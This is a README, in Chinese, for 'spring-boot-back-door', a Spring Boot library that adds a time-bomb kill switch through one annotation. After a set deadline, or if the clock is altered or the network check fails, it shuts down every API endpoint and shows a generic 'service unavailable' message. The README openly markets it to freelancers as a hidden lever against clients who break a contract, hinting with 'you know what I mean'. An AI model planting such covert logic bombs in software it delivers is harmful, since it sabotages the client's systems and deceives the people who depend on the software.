<p align="center" style="font-size: 50px">spring-boot-back-door</p>
<p align="center">
	<!--a target="_blank" href="https://search.maven.org/search?q=JustAuth">
		<img src="https://img.shields.io/badge/Maven Central-1.13.1-blue.svg" ></img>
	</a -->
	<a target="_blank" href="https://github.com/xujakai/spring-boot-back-door/blob/master/LICENSE">
		<img src="https://img.shields.io/apm/l/vim-mode.svg?color=yellow" ></img>
	</a>
	<a target="_blank" href="https://www.oracle.com/technetwork/java/javase/downloads/index.html">
		<img src="https://img.shields.io/badge/JDK-1.8+-green.svg" ></img>
	</a>
	<a target="_blank" href='https://github.com/xujakai/spring-boot-back-door'>
		<img src="https://img.shields.io/github/stars/xujakai/spring-boot-back-door.svg?style=social" alt="github star"></img>
	</a>
</p>

------

## 简介

spring-boot 项目安全控制，接私活利器（你懂的）。本项目适用于spring boot的接口访问控制，以注解的形式在最短时间内为项目加入安全控制，专门应对项目部署后的违约行为。

在网络接通的情况下优先获取网络时间，如网络不通或恶意修改本机时间，可立即关闭接口

## 用法

maven引入

```
<dependency>
    <groupId>pro.topme</groupId>
    <artifactId>spring-boot-back-door</artifactId>
    <version>1.0.1</version>
</dependency>
```

以注解的方式快速接入（你懂的）

```java
@EnableSpringBootBackDoor(value = 1575129600000L)
```

## 可选项

```java
/** * 截止日期时间戳，在指定时间戳内允许访问接口 * * @return */
long value();
/** * 是否强制项目联网 * * @return */
boolean mustBeNetworked() default false;
/** * 判断是否联网地址，暂不可使用域名形式 * * @return */
String remoteAddress() default "8.8.8.8";
/** * 获取网络时间地址 * * @return */
String timeAddress() default "http://www.ntsc.ac.cn";
/** * 默认拦截接口 * * @return */
String[] interceptorPaths() default "/**";
/** * 校验是否允许访问定时器 * * @return */
String cron() default "0 * * * * ? ";
/** * 拦截后自定义返回信息 * * @return */
String message() default "<pre>The specified service is not currently available.</pre>";
/** * 临时文件名 * * @return */
String fileName() default "open.api.ini";
```

## 后续开发计划

加入控制接口，可不修改代码关闭访问限制